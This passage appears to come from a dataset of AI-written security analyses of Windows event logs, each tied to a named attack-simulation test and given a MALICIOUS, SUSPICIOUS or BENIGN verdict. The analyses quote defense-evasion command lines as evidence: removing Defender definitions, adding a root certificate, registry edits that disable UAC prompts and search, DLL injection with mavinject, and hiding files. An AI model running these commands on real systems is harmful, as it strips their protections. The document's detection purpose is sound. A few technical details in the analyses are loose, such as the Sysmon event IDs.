   - A suspicious command was executed via `cmd.exe`, which copied the `powershell.exe` executable to the `AppData` directory as `updater.exe` and launched it with a `-Command exit`.
   - The same command also copied `amsi.dll`, the Antimalware Scan Interface library, which is commonly targeted by malicious actors seeking to bypass security software.
   - The creation of another PowerShell process through `updater.exe` shortly after the original `cmd.exe` command further indicates an attempt to misuse PowerShell.

3. **Process Anomalies**:
   - The user `SERVER002\admin_test` has unusually high integrity level processes running frequently with `cmd.exe` and `PowerShell`, which can be used for privilege escalation or scripting attacks.
   - Frequent process creation for known Microsoft executables (e.g., `whoami.exe`, `HOSTNAME.EXE`; potentially for reconnaissance) without explicit business justification could suggest an attempt to probe the system environment or user context.

4. **Event Log Clearing or Manipulation**:
   - Multiple instances of `wevtutil.exe` were launched. While `wevtutil.exe` can be used for legitimate purposes like querying logs, it is often used in malicious contexts to clear event logs and make tracing activities more difficult.

5. **Security and System Logs**:
   - There are no clear signs of privilege escalation or system compromise from the Security and System logs. The logs focus mostly on time changes and service activities typical for system operations.

**Assessment**:

- The combination of copying system binaries for execution in user-profile directories, direct PowerShell uses via unconventional binaries (`updater.exe`), and attempts at potential log maintenance or clearing are indicative of potentially malicious activity. This behavior pattern is often associated with sophisticated malware or manual hacking techniques aimed at maintaining persistence and operations stealthily.

- The evidence suggests a deliberate attempt to conduct operations that are potentially harmful or bypass typical security mechanisms.

**Resolution**: **MALICIOUS**

**Guidance**:

1. **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent any further unauthorized access or data exfiltration.

2. **Forensic Analysis**: Conduct a deeper forensic investigation of the affected system to identify any additional malware components, rootkits, or unauthorized access.

### Assessment:
- **Suspicious Activity Identified**: 
  - The modification of the registry through `cmd.exe` raises suspicion as it implies a change in system behavior, which may not be normal for a standard user unless logged through a change management process.
  - Multiple high-privilege operations and process executions under the account ""admin_test,"" including remote access/logon, should be scrutinized.

### Recommendation for Further Investigation:
- Review the intent and boundary of the registry modification—check script execution records, user activity logs, and any incident tickets raised for changes.
- Verify the origin of the NTLM logon event to ensure it was legitimate and not indicative of an unauthorized access attempt.
- Ensure that the privilege usage of the user ""admin_test"" aligns with job roles and the principle of least privilege.
- Conduct a review of scheduled tasks, scripts, and system management functions to correlate with known administrative actions or sanctioned IT operations.

### Final Resolution:
- **SUSPICIOUS**: Further investigation is needed to explore the context and legitimacy of registry modifications, user privileges, and NTLM authentication usage. This investigation will help determine if they are aligned with expected administrative actions or indicative of potential compromise."
Remove Windows Defender Definition Files,"Based on an analysis of the provided logs, the following points can be observed:

### Application Log

- The events recorded concern ""Windows Defender"" and consistently indicate ""SECURITY_PRODUCT_STATE_ON"". This indicates that Windows Defender was turned on and active during this time. There are no indications of Windows Defender being disabled or manipulated.

### Sysmon Log

- Multiple executions of well-known Windows system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. While some of these tools are often used by administrators, specific usage patterns could be suspicious.
  
- The usage of `wevtutil.exe` could be legitimate if used by an admin for querying logs but could be suspicious if someone is trying to clear logs or gather extensive information in prep for an attack.
  
- `conhost.exe` and `cmd.exe` are also used often in both benign and malicious activities; hence, details such as `CommandLine` parameters and parent processes may provide more context.
  
- A notable command executed is `""cmd.exe"" /c ""C:\\Program Files\\Windows Defender\\MpCmdRun.exe"" -RemoveDefinitions -All""`, which is suspicious as it attempts to remove Windows Defender definitions. This is potentially malicious since removing AV definitions would lower defenses against malware.
  
- Subsequent execution of `MpCmdRun.exe` to remove definitions is out of the ordinary for typical regular use, especially by a high-privilege user within the system, hence matches suspicious/malicious behavior.

### System Log

- The ""Kernel-General"" event indicating modifications to the registry hive associated with `ELAM` (Early Launch Anti-Malware) shows a single key update. This could be benign if due to regular updates but should be verified in the context of recent system behavior to rule out attempts to disable or interfere with boot-time security.

### Security Log

- The security log data is not provided. Thus, insights into account management, login attempts, and audit logs regarding users and groups are not available. Typically, a lack of log data here impedes a comprehensive analysis, but the focus can remain on observable activity.

### Assessment

Overall, while most activities could be explained as administrative or normal user operations, the command to remove Windows Defender definitions stands out as an orchestrated attempt to weaken system security. This activity elevates concern levels toward potential compromise or preparation for a more severe attack.

### Conclusion: MALICIOUS

### Guidance on How to Proceed

- **Immediate Action:** Restore Windows Defender definitions and ensure that the service is running adequately. Check the system for unauthorized users or backdoor accounts.
  
- **Detailed Investigation:** Conduct a comprehensive forensic analysis to identify if any persistence mechanisms have been installed or if further compromise has occurred. Pay special attention to account activities, changes in scheduled tasks, and startup settings.

- **Monitoring and Alerts:** Increase monitoring sensitivity on this host and any other systems it communicates with, especially regarding further attempts to modify or disable security features.

- **User Training:** If this is not a false positive or misunderstanding, ensure user(s), especially those with admin privileges, are aware of safe practices and the importance of not interfering with security applications.

It's essential to address this potential threat promptly due to the security implications associated with disabling antivirus protections."
Install root CA on Windows with certutil,"### Analysis of Logs:

1. **Execution of PowerShell and CertUtil**:
   - There are PowerShell executions noted in the logs, particularly running with command lines that suggest modification to certificate stores: `""powershell.exe & {certutil -addstore my $env:Temp\\rootCA2.cer}""`.
   - CertUtil is a legitimate tool but frequently abused in attacks for certificate manipulation, and the presence of such commands can indicate an attempt to install potentially malicious certificates.

2. **Frequent Wevtutil Executions**:
   - **Wevtutil.exe** is used to interact with event logs and its execution multiple times (process IDs: 4632, 4556, 4616, 5956, 6636) can suggest log tampering or clearing activities, commonly seen in malicious activity to cover tracks.

3. **Unexpected User and Elevated Token Usage**:
   - Most processes are running under `SERVER002\admin_test`, a user which needs further scrutiny to ensure it is a legitimate admin account not compromised.
   - Privilege escalation via elevated tokens is noted in the security logs with privileges such as `SeDebugPrivilege` which can signify an attempt to perform actions requiring higher-level permissions.

4. **Processes Launched**:
   - A wide variety of processes related to Microsoft Edge updates were observed. While these can be legitimate, they appear in close proximity to potentially suspicious activities like unauthorized certificate store manipulations and frequent wevtutil log access. Therefore, this should be reviewed against the Edge update timeline and network logs for external connections.

5. **Logon Events**:
   - A few `LogonType 5` events found, which suggest service-type logons. Ensure these are expected on the system, particularly the frequency and timings aligning with user activity logs.

### Assessment:

Several indicators point towards potentially suspicious behavior:
- **Usage of tools like PowerShell with certutil** and `wevtutil` in combination with a non-standard admin account usage and frequent security privilege escalation events.
- **The context** (CEO's machine) underscores the importance, and the actions are typical of attempts to infiltrate or backdoor a system.

### Resolution: **SUSPICIOUS**

**Guidance on How to Proceed**:
- **Immediate Isolation** of the affected system to prevent further potential malicious activity.
- A **deeper investigation** into the account ""SERVER002\admin_test"" to confirm its authenticity and integrity.
- **Collect and analyze network traffic logs** for any signs of unknown connections or data exfiltration.
- Review **system integrity** by checking file hashes and verifying core system files to ensure tampering has not occurred.
- Contact the **incident response team** to assess and potentially mitigate against any identified threats.
- As further investigation could clarify whether this is truly a benign sequence or more severe, conduct a thorough security audit post-analysis to update security measures and policies."
Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,"### Detailed Analysis of the Logs:

#### Observations:

1. **Time Adjustments**:
   - System logs show multiple time changes managed by svchost.exe. This action is not immediately suspicious as `svchost.exe` is a legitimate process used by Windows, often involved in managing system services, including time updates.

2. **Time Service Event**:
   - The Microsoft-Windows-Time-Service event reflects synchronizations with a legitimate time source, `time.windows.com`. This is typical behavior for system time adjustments.

3. **Security Logs**:
   - Event ID 4616 in the security log indicates time change events. These correlate with the system time change entries involving `svchost.exe`. Such time change events are typically benign but should be monitored in high-security environments for unauthorized modifications.

4. **PowerShell Activity**:
   - **PowerShell Invocation**: A PowerShell script attempts to modify `ConsentPromptBehaviorAdmin` from the Windows registry to `0`. This change bypasses user account control (UAC) prompts for administrators, a potential security risk and an indicator of privilege escalation attempts.
   - The same command repeats across several entries, consistent with automated or scripted behavior, suggesting potentially malicious intent, possibly for privilege escalation without user interaction.

5. **Sysmon Logs**:
   - Events related to `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are seen running with high integrity. While legitimate Windows binaries, in combination, they could be used to gather system information.
   - Instances of `wevtutil.exe` suggest log management or querying actions, which may be routine, but in context can be used by attackers to clear logs or perform reconnaissance.
   - Multiple executions of `MicrosoftEdgeUpdate.exe` and related processes appear legitimate as they are tied to Microsoft Edge updates, matching standard system and application maintenance operations.

#### Indicators of Malicious Activity:

- **PowerShell Activity**: The PowerShell events indicating attempts to modify the UAC settings (ConsentPromptBehaviorAdmin) to disable it without consent are particularly concerning. This action suggests attempts to modify system security settings to enhance attacker control.
- **Processes typically linked to log manipulation**: The repeated use of `wevtutil.exe` could signify attempts to manipulate event logs, often seen in attempts to hide malicious activity.

### Conclusion and Recommendations:

**Resolution: MALICIOUS**

- The PowerShell script altering registry settings to disable UAC prompts is a clear indicator of attempted privilege escalation, a common technique used by malware for persistence and broad control over a compromised system without user knowledge or intervention.
- Immediate steps should include:
  - Isolating the affected system and conducting a thorough malware scan and forensic investigation.
  - Reviewing recent user activities, applications installed, and network connections initiated from this host.
  - Remediation should focus on restoring security settings and any impacted configurations.
  - Reviewing administrative access and enforced security policies, specifically UAC-related configurations.
  - Potentially altering UAC settings and implementing stricter administrative rights management.
- Reporting and sharing these findings with the broader IT security team to prepare for similar incidents.

The logs provided show sufficient evidence of attempted unauthorized changes to system security settings, thus advising immediate corrective and protective actions."
Modify Registry of Current User Profile - cmd,"Upon reviewing the provided event logs, the analysis focuses on identifying any anomalous activities or signs of potential compromise that could indicate malicious activity. Below is a detailed analysis based on the log entries:

### Analysis:

1. **Time Synchronization Events**:
   - The Security log entries with Event ID 4616 indicate time change events, which are commonly part of normal system behavior when time synchronization with an external source occurs. These events are benign and show that the time on `Server002` was synchronized. 

2. **Process Creation Events**:
   - Multiple entries in the Sysmon log (Event ID 5) show process creation for typical Windows processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`. While these are legitimate system utilities, their execution should be scrutinized when they are chained together or executed under elevated privileges.

3. **Registry Modification**:
   - The execution of `cmd.exe` with a command to modify the registry (`reg add`) to change settings for hiding file extensions is suspicious. The command line indicates an attempt to modify `Explorer` settings, potentially to hide file extensions for known file types: 
     ```
     ""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
     ```
   - This action should be considered suspicious as it could be used to obscure malicious files from the user or indicate a script or attack chain executed on the machine.

4. **Process Execution Context**:
   - It's noted that all suspicious activities are performed by the `SERVER002\admin_test` user, which implies actions were executed in a high-integrity context. This means they had elevated privileges, enhancing the risk if performed by a malicious actor.

5. **System Services and Network Services**:
   - System service processes like `svchost.exe`, `sppsvc.exe`, `wsmprovhost.exe`, and others are executing, which are typical for a Windows environment. However, given the registry modifications detected, these could potentially be part of a script or malware attempting to mask its presence.

### Assessment:

- The logs showcase potentially suspicious activities involving registry modifications and use of system utilities under elevated privileges. These actions could be part of a benign administrative task, but they are often leveraged in malicious contexts to hide malicious activity from users.

### Conclusion:

**Resolution**: SUSPICIOUS

Given the identified behavior, further investigation is recommended to determine the intent behind the command executions, particularly the registry modification. It is important to verify:
- If the actions were performed by an authorized administrator as part of a maintenance task.
- If similar events have occurred without proper authorization or correlation with normal administrative tasks.
- Monitor the system for any additional indicators of compromise and anomalous behavior post these events.

### Guidance on How to Proceed:

- Conduct a user and process audit on `SERVER002`, particularly for actions taken by the `admin_test` user.
- Confirm with the IT department if these changes and actions were part of a scheduled administrative activity.
- Review any correlating logs for evidence of malicious intent or further compromise.
- Monitor for recurring similar activities on this and other critical systems.
- Consider applying tighter security measures on systems associated with high-profile users like the CEO."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"Upon reviewing the provided Windows event logs, here is the detailed analysis focusing on suspicious and potentially malicious activities:

### Suspicious Observations and Analysis:

1. **Unusual PowerShell Execution:**
   - Within the Windows PowerShell logs, we see an execution of `powershell.exe` with a suspicious command line: 
     ```powershell
     C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\svchost.exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data.xml"" output.txt
     ```
   - The use of a temporary path and a name such as `svchost.exe` for a file not located in its typical directory (`C:\\Windows\\System32`) is suspicious. This could indicate an attempt to masquerade as a legitimate service host process to execute a potentially malicious payload.

2. **Attempts to Access Credential Store (EventID 5379):**
   - Multiple attempts were made to access Windows credential resources using the ""admin_test"" account (Logon ID `0x13C0BD`). These actions failed with a `ReturnCode` indicating potential unauthorized access attempts. This behavior could signify reconnaissance or credential harvesting activities.

3. **Process Execution from Temporary Directories:**
   - According to the Sysmon logs, there are records of `svchost.exe` executed from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\`. The execution of typically system-reserved executables from user temp directories is a common tactic used in malware propagation.

4. **Unhandled Exception in svchost.exe:**
   - The application log shows an unhandled exception in the fake `svchost.exe` process due to a `System.IO.DirectoryNotFoundException`, indicating the process may have attempted to access directories or files that do not exist (likely part of a payload or a command to execute malicious activities).

### Assessment:

- **Indicators of Compromise:**
  - The suspicious execution of commands through PowerShell.
  - Execution and masquerading of system files from unusual directories.
  - Unsuccessful access attempts to credential stores using a local administrative account.

Given the evidence provided through multiple logs pointing toward potential masquerading of system processes for malicious intentions, and unusual activities not typical in a standard user or administrative operation, the events suggest an attempt to execute malware via PowerShell using disguise techniques.

### Recommendation and Conclusion:

- Quarantine and investigate the involved files, especially those hosted in the temporary directories.
- Conduct a full security audit of the affected system and the network to identify any lateral movements or further developments.
- Review and restrict permissions to PowerShell and administrative accesses, enforce logging and alert systems for similar activities in the future.

### Resolution:

Given the identified activities, the overall assessment concludes with a resolution of:

- **MALICIOUS**

It is highly advisable to proceed with immediate incident response protocols to contain and remediate the threat."
Masquerading - non-windows exe running as windows exe,"### Detailed Analysis of the Logs:

#### Key Observations:

1. **PowerShell Activity:**
   - The PowerShell logs indicate an execution of a script where an executable, ""data.003.exe,"" from a temporary location was copied as ""svchost.exe"" and executed. This behavior is suspicious as renaming an executable to ""svchost.exe"" (a legitimate Windows process) is a common technique used by malicious actors to disguise their payloads.

2. **Security Logs:**
   - Repeated Event ID 5379 indicates failed credential escalations. The repeated attempts with authority level ""SYSTEM"" suggest an attempt to escalate privileges or access restricted accounts. The ReturnCode ""3221226021"" suggests a failure, likely due to invalid credentials or access attempts.

3. **Sysmon Logs:**
   - A PowerShell process (pid: 4312) was responsible for the suspicious activity, having a command invoking an executable from the temp directory, consistent with techniques used by malware to maintain persistence or execute payloads.
   - Subsequent executions of standard Windows binaries such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` from the same session indicate typical behavior to gather information or manipulate event logs.

4. **System Logs:**
   - Routine Windows activities such as updates and Defender status are noted, indicating an otherwise normal operational environment.

5. **Suspicious Execution:**
   - A high integrity level was observed in the PowerShell execution context, which indicates potential misuse of administrative privileges.
   - The behavior of executing a program from a non-standard directory and then attempting to blend with system processes (via renaming to svchost.exe) signals potential malicious intent.

### Assessment:

Based on the logs:

- The PowerShell command is particularly concerning due to its behavior of trying to disguise as a system process (svchost.exe) and executing a potentially harmful payload. This is a red flag and suggests the intent to perform malicious activities.
- The failed credential access attempts (Security Logs, Event ID 5379) indicate attempts to gain unauthorized access or escalate privileges.
- The Sysmon logs indicate multiple executions of suspicious commands and processes following the initiation of the PowerShell script.

### Threats/Risks Identified:

- Potential malware execution and privilege escalation attempts.
- Unauthorized access and potential compromise of system integrity and data.

### Guidance on How to Proceed:

- **Immediate Containment:** Quarantine the affected system (Server002) to prevent potential spread of malware. Disconnect from any network connections.
- **Further Investigation:** Conduct a thorough forensic investigation to determine the payload's nature and any changes made by the malicious script. Analyze ""data.003.exe"" statically and dynamically to ascertain its functionality.
- **User Education:** Train users on recognizing phishing attempts or suspicious downloads that may lead to such incidents.
- **Review Security Policies:** Implement PowerShell script execution policies to limit the use of scripts from non-trusted sources.
- **System Hardening:** Review user permissions, enabling logging and monitoring for unauthorized access attempts.
- **Antivirus/Update Review:** Ensure antivirus definitions are up to date and perform full scans across the network.

### Resolution:

This activity is determined to be **MALICIOUS** based on the indicators observed in the logs. Immediate actions as outlined above are necessary to mitigate potential impacts."
Modify UseTPM Registry entry,"Upon reviewing the provided Windows event logs, I have identified several patterns of activity that require further analysis. Let's break down the significant events observed:

1. **EdgeUpdate Service Execution:**
   - There are numerous entries pertaining to the `MicrosoftEdgeUpdate.exe` service. The logs show the execution of this process with various command-line arguments related to updates and installations. This activity involves the execution of `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, `MicrosoftEdgeUpdate.exe`, and `MicrosoftEdgeUpdateComRegisterShell64.exe` within the context of `NT AUTHORITY\SYSTEM`.
   - There is no direct indication that these activities are malicious, though extensive updates or installations can sometimes mask suspicious behavior. Given that this is a Microsoft process and the updates seem systematic, this might be normal behavior for an automated update or installation process.

2. **System Tool Executions:**
   - The execution of `cmd.exe` with the command line involving `reg add` operation (`""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f`). This action modifies registry settings related to BitLocker, which could be normal administrative activity but also fakes a risk if not initiated by authorized personnel.
   - The use of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` suggests potential manual intervention or scripted/system administration tasks.
   - The presence of `wsmprovhost.exe` as the parent of certain processes suggests that Windows Remote Management might be in use, which is generally legitimate but can also be used maliciously.
   
3. **Sysmon Logs:**
   - Sysmon logs indicate a high level of activity with a large number of process creation events. This includes consistent logging from Sysmon's operational channel, indicating it is monitoring and logging process executions across the system.
   - The integrity levels are often ""High"" for operations logged under the `SERVER002\admin_test`, which is typical for administrators but can be a red flag if unexpected.

### Assessment and Recommendation:

- **Resolution: SUSPICIOUS**

The activity primarily involves legitimate processes (Microsoft Edge Update, `cmd.exe` for registry changes, and system tools), but the volume and combination of these actions (particularly the registry changes and extensive use of system utilities) raise some concerns that warrant further investigation. The context around who is executing these actions (especially `admin_test` user and system) needs to be confirmed as legitimate.

**Suggested Actions:**
- Verify with IT if the `admin_test` account and its activities reflect regular maintenance or administrative work.
- Check for any scheduled tasks or scripts corresponding to the observed activities.
- Inspect the registry change to validate whether it aligns with company policy or recent authorized changes.
- Consider conducting a threat hunt within the network to ensure there are no indicators of lateral movement or further compromise.

Overall, while there is no clear evidence of malicious action, the activity remains suspicious enough to warrant a deeper inspection to rule out potential unauthorized access or misuse."
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"**Analysis Summary:**

Upon analyzing the provided logs, two categories of events were highlighted as potentially suspicious:

1. **Windows PowerShell Logs:**
   - **PowerShell Activity:** The PowerShell logs show a command being executed that modifies the Windows Registry to change the value of `PromptOnSecureDesktop` to 0. This action disables the Secure Desktop mode, which is used to display User Account Control (UAC) prompts. While this action alone could have legitimate administrative purposes, it is also a known technique used by attackers to bypass UAC for privilege escalation.

2. **Sysmon Logs:**
   - **Sysmon Activity:** Numerous processes such as `wevtutil.exe`, `conhost.exe`, `wevutil.exe`, and `whoami.exe` are executed by the user `SERVER002\admin_test`. The sequence is accompanied by a PowerShell command precisely with the same action described above that targets registry modification.
   - **Unusual Patterns:** The frequent invocation of utilities like `whoami` and PowerShell with high integrity suggests potential reconnaissance or privilege escalation attempts.

**Assessment of the Situation:**

- The observed behavior, specifically the PowerShell command that alters `PromptOnSecureDesktop` and the corresponding process executions, indicates a potential misuse of administrative capabilities or compromised account usage.

- Although the execution of these tools can be legitimate in an administrative context, the specific change to `PromptOnSecureDesktop` combined with other suspicious command-line utility executions raises a red flag for malicious activity.

**Resolution:**

- **Resolution:** SUSPICIOUS

**Threats or Risks Identified:**

- **Potential UAC Bypass:** The modification of the `PromptOnSecureDesktop` setting suggests attempts to reduce system security constraints, possibly to facilitate further attacks without user notification.

- **Reconnaissance/Privilege Escalation:** The observed command-line activity could be part of an ongoing reconnaissance phase or an active privilege escalation attempt by an attacker after gaining access to an administrative account.

**Guidance on How to Proceed:**

1. **Immediate Action:**
   - Verify whether the account `SERVER002\admin_test` had a legitimate reason to perform these actions.
   - Review and possibly reset credentials for the affected account to rule out unauthorized access.
   - Monitor for subsequent suspicious activity on `SERVER002`.

2. **Further Investigation:**
   - Assess historical activity logs to determine if similar patterns occurred previously.
   - Conduct a broader investigation to identify other potentially compromised systems.

3. **Preventive Measures:**
   - Implement stricter monitoring and alerts for changes to `PromptOnSecureDesktop`.
   - Ensure administrative actions are logged and verified regularly.
   - Educate users about the risks of unauthorized changes and reinforce multi-factor authentication for high-privilege accounts."
mavinject - Inject DLL into running process,"After analyzing the provided logs, several key observations can be made regarding the potential security incident. The primary focus here is the Sysmon log entries, particularly the command-line activities, execution paths, and the involved user accounts. Here's a breakdown of the findings:

1. **Powershell and Command Line Activity**:
   - The occurrence of `powershell.exe` being executed by the user `SERVER002\admin_test` could be considered normal under administrative tasks, but any Powershell usage should be assessed with greater scrutiny, especially in high-profile machines like a CEO's workstation.
   - Notably, a suspicious command line activity was observed with `cmd.exe /c mavinject.exe 1000 /INJECTRUNNING ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\x64\\data.dll""`. This command appears to use `mavinject.exe`, which is a tool that can be used to inject a DLL into a running process. This behavior is typically associated with advanced attackers attempting to execute code within a target process space stealthily.

2. **Processes and Integrity Levels**:
   - The log indicates several processes (e.g., `mavinject.exe`) executed with high integrity levels. Operating with a high integrity level implies elevated privileges, which can be leveraged for unauthorized changes to the system or data exfiltration.
   - The transition from routine processes like `wsmprovhost.exe` to direct command execution with injection attempts suggests a potential compromise or misuse of administrative privileges.

3. **Edge Update Related Activity**:
   - Numerous entries involving Microsoft EdgeUpdate processes are observed. While these could indicate a legitimate update, the proximity to the unusual `mavinject.exe` usage and running from a temporary directory also adds a layer of suspicion. Though this, by itself, might not be conclusive of malicious intent.

4. **Use of Temporary Directories**:
   - The use of temporary directories (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\x64\\data.dll` in combination with `mavinject.exe`) is often leveraged by attackers to stage tools, payloads, or to avoid immediate detection.

**Assessment and Conclusion**:

The identified command-line usage of `mavinject.exe` to inject a DLL from a temp directory, coupled with the high integrity level, stands out as a significant indicator of potential malicious activity. This action is not typical for standard operations and hints at a possible compromise or malicious attempt to gain further control within the system.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
   - Immediately isolate the impacted machine (CEO's machine) from the network to prevent further spread or data exfiltration.
   - Conduct a comprehensive forensic analysis on the specific directories used in the suspicious entries to ascertain the nature and potential payload of the DLL.
   - Review user activity, especially of `admin_test`, for unusual patterns and validate if the credentials have been compromised.
   - Consider resetting passwords and increasing monitoring on accounts with elevated privileges.
   - Deploy enhanced monitoring for similar injections across the network to identify if this is part of a larger campaign.
   - Report the activity to relevant authorities if it complies with organizational policies on potential breach disclosures."
Add Network Share,"After analyzing the provided Windows event logs, here is a detailed analysis:

### **System Logs Analysis:**

1. **Time Synchronization Events:**
   - The logs contain multiple events related to time changes executed by svchost.exe (a legitimate Windows service host process), which is responsible for managing system services. This activity seems tied to time synchronization with an external time source (`time.windows.com`) and does not indicate any suspicious behavior on its own. Kernel-General EventID 1 and 24 suggest typical time adjustments.

### **Security Logs Analysis:**

1. **Security-Auditing Events (EventID 4616):**
   - These events also show time change activity performed by svchost.exe under the `LOCAL SERVICE` account context. The recorded time changes correspond with those seen in system logs and appear standard for Windows operation pertaining to system time synchronization.

### **Sysmon Logs Analysis:**

1. **Frequent Execution of SYSTEM Commands:**
   - There are multiple instances of typical system utilities like `whoami.exe`, `hostname.exe`, and `cmd.exe` being executed. While command-line executions involving network shares using `net.exe` and `net1.exe` stand out because they involve networking operations, the command provided in the logs (""`cmd.exe /c net use c: \\test\share & net share test=\\test\share /REMARK:\""test share\"" /CACHE:No`"") is not inherently malicious. It seems to be a setup for network drive mapping and sharing.
   
2. **Process Executions:**
   - Execution of processes such as `whoami.exe`, `cmd.exe`, and other typical command line utilities (`conhost.exe`, `wevtutil.exe`) operating under high integrity and from an admin-like account (`SERVER002\admin_test`). No immediate indicators of compromise or privilege escalation attempts were noted; though the running of these processes could imply investigative or administrative actions, such as scripting tasks or system management.

3. **MicrosoftEdgeUpdate.exe:**
   - It runs under `NT AUTHORITY\SYSTEM`, which is standard for an update service. There is no evidence in the logs indicating this process conducted any malicious activity beyond what is usual for its service function.

### **Assessment and Conclusion:**

The provided logs indicate typical and legitimate system and administrative operations. The behaviors observed suggest time-sensitive tasks and system administration activities, particularly relating to time synchronization and basic command-line utility usage.

- **Potential Risks:** While network share creation could be utilized for data exfiltration or unauthorized access within an environment, there's no indication in these logs of unauthorized or malicious intent based solely on the commands used. If there are contextual concerns over the necessity or frequency of such operations, further inquiry into recent administrative scripts or tasks may be warranted.

- **Recommendation for Proceeding:**
  - Verify with IT operations or personnel if these actions are consistent with normal administrative tasks or scheduled operations.
  - Continuously monitor for any deviations in patterns or accesses from the user `SERVER002\admin_test`.
  - Review if the sharing command in use coincides with network policies or ongoing operations.

### **Final Resolution:**

- **BENIGN:** Based on the information analyzed, these logs contain activity that is typical and does not raise flags for malicious intent. Further monitoring should continue but immediate concern is not necessary unless correlated with other suspicious activities not contained in these logs."
Create Windows Hidden File with Attrib,"**Detailed Analysis:**

Upon reviewing the provided Sysmon logs, we can observe several entries that highlight potential suspicious activity. This analysis will focus on the possible red flags and their implications:

1. **Repeated Command Line Executions:**
   - Several instances of `cmd.exe` and associated `conhost.exe` processes executing specific command line operations are noted. Notably, the command `cmd.exe /c echo system_Attrib_data.001 >> %temp%\\data.001.txt` suggests scripting behavior or automated actions that aim to create or manipulate files. The name `system_Attrib_data.001` and use of the echo command to append or create files in the temp directory without explicit context raise concern.

2. **Privilege Level and User Context:**
   - The processes are executed under the user `SERVER002\\admin_test` with high integrity levels, indicating administrative privileges. While this could be normal, the use of admin privileges with scripting-like commands could suggest preparation or part of an exploitation process changing system attributes or configurations.

3. **File Attribute Change:**
   - The execution of `attrib.exe +h %temp%\\data.001.txt` after other commands points to attempts to hide files by setting them to hidden attributes. This behavior can often be used by malware to prevent detection by casual observation.

4. **Process Parentage:**
   - Some of these operations are initiated from `wsmprovhost.exe`, which is a legitimate Windows process related to Windows Remote Management. However, its association with these particular actions needs further contextual understanding as it could signal remote control or scripted automation.

5. **Edge Update Logging:**
   - Throughout the logs, multiple Edge Update-related processes (`MicrosoftEdgeUpdate.exe`) are executed. While the execution and updating of Edge are not intrinsically suspicious, careful timing with other suspicious activities or any unauthorized or out-of-band updating could raise a flag, especially with its operation under `NT AUTHORITY\\SYSTEM`.

6. **Event Anomalies:**
   - The Application log shows services related to Edge updates being stopped multiple times. This is not typically intrusive but could be relevant if coordinated with malicious interactions.

**Assessment:**

The aggregation and pattern of command executions, the observed change in file attributes, and the use of system-level operations via parent processes such `wsmprovhost.exe` provide some indicators of potentially suspicious activity, particularly if there's no known authorized script or task scheduled for such operations. The behavior might indicate a script or attacker attempting to manipulate or hide critical system changes.

**Resolution:**

**SUSPICIOUS** - The logs point to activities that don't appear to be legitimately documented or easily explained through routine operations. They warrant further investigation to confirm whether such actions were authorized or benignly scripted tasks. The potential for covert malicious activities, given the privilege level and nature of operations, cannot be dismissed without additional scrutiny.

**Guidance on How to Proceed:**

- **Conduct a Thorough Investigation:**
  - Review the task scheduling or any scripts associated with the user `admin_test` to verify if the actions were part of an expected set of operations.
  
- **Inspect Corresponding System Logs:**
  - Check additional logs for any signs of unauthorized access or deviations from typical user patterns.
  
- **Isolate Anomalous Files:**
  - Cleanse the system by checking the integrity of the created or accessed files to identify if any contain malicious payloads.
  
- **Monitor and Audit Further Activity:**
  - Set up alerts for any further repeated actions and audit user sessions for any unusual access patterns or anomalies.
  
- **Engage in Communication:**
  - Discuss with IT or Admin teams to confirm expected activities and uncover any undocumented legitimate activities.

Activate Windows NoFind Group Policy Feature,"### Detailed Analysis:

After a thorough review of the provided Windows event logs, here's a breakdown of the findings:

1. **Application Log:**
   - The Application log shows activity related to the Software Protection Platform Service. This is typically benign and related to the regular operation of Windows licensing services.

2. **Sysmon Log:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` appear throughout the Sysmon logs. The `wevtutil.exe` is a command-line utility for managing event logs and event log subscriptions, while `conhost.exe` usually represents Console Window Host which handles console windows.
   - A significant entry is the execution of `cmd.exe` with a command line argument that modifies the registry: `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFind /t REG_DWORD /d 1 /f""`. This action disables the Windows search option, which could be indicative of an attempt to obscure activities on the machine.
   - The `reg.exe` being used in a similar context further confirms the registry change attempt.
   - The presence of `whoami.exe` and `hostname.exe` executions suggests user reconnaissance, which can be part of malicious behavior patterns.
   - The hash values for executables do not immediately align with known malware, but modification of registry policies is highly suspicious.

3. **Security Log:**
   - Security log entries predominantly indicate time adjustments, which are normal activities and involve `svchost.exe` running as `LOCAL SERVICE`.

4. **System Log:**
   - The system log entries again show time synchronization activities primarily involving `svchost.exe`. There are no anomalies associated with this process.

5. **Assessment:**
   - The repeated use of `wevtutil.exe` and registry modifications via `cmd.exe` executed by `admin_test` are suspicious. The registry edit to disable search functionality is particularly concerning, as it could indicate an attempt to disguise further malicious actions or maintain persistence on the system.

### Conclusion and Resolution:

- **Resolution: SUSPICIOUS.**
  - The activities observed in the logs, specifically the registry modification preventing search functionality, warrant further investigation. Although there isn't definitive proof of malicious intent (such as known malware signatures or critical system alterations), the pattern of behavior and choice of commands suggest potential misuse or preparation for future compromising actions.

Compile After Delivery using csc.exe,"Upon review of the provided Windows event logs across the System, Security, Sysmon, and Windows PowerShell logs, the following analysis is made:

### Analysis of Logs:

1. **System Log Entries:**
